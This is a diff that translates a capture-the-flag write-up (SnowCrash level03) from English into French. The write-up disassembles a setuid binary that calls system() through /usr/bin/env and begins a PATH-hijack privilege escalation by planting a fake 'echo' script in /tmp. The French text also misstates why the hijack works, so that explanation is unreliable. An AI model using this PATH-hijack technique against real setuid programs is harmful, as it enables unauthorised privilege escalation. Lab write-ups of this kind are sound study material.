@@ -1,6 +1,6 @@
-# Level 03
+# 03 - Binary exploit: PATH
 
-- We login as user level03.
+- On se connecte en tant que level03.
 ```
 level03@SnowCrash:~$ ls -l
 total 12
@@ -13,21 +13,7 @@ Exploit me
 ```
 
 
-- A binary has been left for us, it belongs to user flag03 and group level03. Additionally, [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) are set.
-Thus, this binary is executed with the privileges of user flag03 and group level03.
-Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
-```
-(gdb) info functions
-All defined functions:
-
-File /home/user/level03/level03.c:
-int main(int, char **, char **);
-
-Non-debugging symbols:
-0x08048340  _init
-...
-```
-
+- Un binaire nous a été laissé, il appartient à l'utilisateur flag03 et au groupe level03. De plus, les [bits de permission setuid et setgid](https://en.wikipedia.org/wiki/Setuid) sont activés. Examinons ce binaire de plus près à l'aide de [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
 ```
 (gdb) disas main
 Dump of assembler code for function main:
@@ -61,16 +47,14 @@ End of assembler dump.
 ```
 
 
-- We can see that the program makes a call to `<system@plt>` right after moving the address `0x80485e0` on top of the stack.
-Let's display the value contained at this address.
+- Nous pouvons voir que le programme fait un appel à `<system@plt>` juste après avoir déplacé l'adresse `0x80485e0` au sommet de la stack.
 ```
 (gdb) x/s 0x80485e0
 0x80485e0:       "/usr/bin/env echo Exploit me"
 ```
 
 
-- So, the program calls `system("/usr/bin/env echo Exploit me")`.
-In bash, `echo` is a built-in command, but with the preceding `/usr/bin/env`, the program will use the `PATH` environment variable to search for the echo binary.
+- Donc, le programme fait `system("/usr/bin/env echo Exploit me")`. En **bash**, `echo` est un built-in, mais pas en **sh**, on peut donc exploiter la variable d'environnement `PATH`.
 ```
 level03@SnowCrash:~$ echo "getflag" > /tmp/echo
 ```
